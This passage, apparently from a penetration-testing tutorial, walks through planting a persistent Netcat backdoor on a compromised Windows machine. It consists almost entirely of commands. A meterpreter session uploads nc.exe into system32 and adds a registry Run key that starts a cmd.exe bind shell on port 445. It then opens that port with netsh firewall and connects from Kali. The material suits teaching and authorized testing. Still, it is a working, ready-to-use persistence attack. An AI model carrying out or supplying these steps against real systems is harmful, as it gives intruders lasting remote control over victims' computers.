meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32

meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run

meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'

meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc

 

Next, we need to alter the system to allow remote connections through the firewall to our Netcat backdoor. We open up an interactive command prompt and use the ‘netsh’ command to make the changes as it is far less error-prone than altering the registry directly. Plus, the process shown should work across more versions of Windows, as registry locations and functions are highly version and patch level dependent.

 

meterpreter > execute -f cmd –i

C:\Documents and Settings\Jim\My Documents > netsh firewall show opmode

 

C:\Documents and Settings\Jim\My Documents > netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL

netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL

Ok.

 

Verify:

C:\Documents and Settings\Jim\My Documents > netsh firewall show portopening

 

Now you can Netcat inbound any time:

root@kali:~# nc -v 172.16.104.128 445